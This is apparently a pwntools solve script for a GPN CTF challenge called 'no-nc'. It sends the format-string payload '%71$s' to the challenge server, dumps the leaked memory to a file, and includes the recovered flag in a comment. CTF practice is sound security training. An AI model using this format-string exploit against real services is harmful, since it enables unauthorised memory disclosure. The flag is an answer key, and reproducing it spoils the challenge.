from pwn import *
from pathlib import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./nc"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("portshire-of-uncomfortably-powerful-hope.gpn23.ctf.kitctf.de", 443, ssl=True)


def ddebug(io, b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()


io.readline()
io.sendline(b"%71$s\x00")
io.recvline()
io.recvline()

Path('nc_remote').write_bytes(io.recvall())
"""
(pip_venv) ➜  no-nc strings nc_remote |grep {
GPNCTF{up_aND_Down_a1L_arOUNd_GO3s_Th3_N_DIM3nsI0Na1_Circ1e_wtf_i5_7H1s_Fl4g}
"""
